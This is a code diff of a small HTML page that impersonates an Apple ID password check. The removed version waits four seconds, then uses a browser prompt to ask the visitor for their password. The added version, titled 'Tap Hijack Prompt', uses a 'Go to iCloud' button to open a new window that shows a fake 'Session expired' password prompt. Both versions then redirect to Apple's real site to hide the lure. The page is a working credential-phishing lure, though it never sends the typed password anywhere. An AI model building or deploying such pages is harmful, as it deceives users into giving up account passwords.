@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Security Check</title>
+  <title>Tap Hijack Prompt</title>
   <style>
     body {
       background: #111;
@@ -11,30 +11,34 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      flex-direction: column;
     }
 
-    h2 {
-      color: #0f0;
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #007aff;
+      border: none;
+      border-radius: 6px;
+      color: white;
     }
   </style>
 </head>
 <body>
+  <button onclick="go()">Go to iCloud</button>
 
-<h2>Loading secure session...</h2>
+  <script>
+    function go() {
+      const w = window.open("", "_blank");
 
-<script>
-  // Delay total: 4 detik
-  setTimeout(() => {
-    const input = prompt("🔐 Identity verification required\nPlease confirm your password:");
-    
-    // Setelah prompt, lakukan redirect ke trusted domain
-    setTimeout(() => {
-      location.href = "https://appleid.apple.com"; // Trusted domain
-    }, 500); // jeda singkat setelah prompt agar tidak terasa abrupt
-
-  }, 4000);
-</script>
-
+      setTimeout(() => {
+        w.document.write(`
+          <script>
+            const pw = prompt("🔒 Session expired. Please re-authenticate.");
+            location.href = "https://appleid.apple.com";
+          <\/script>
+        `);
+      }, 300);
+    }
+  </script>
 </body>
 </html>
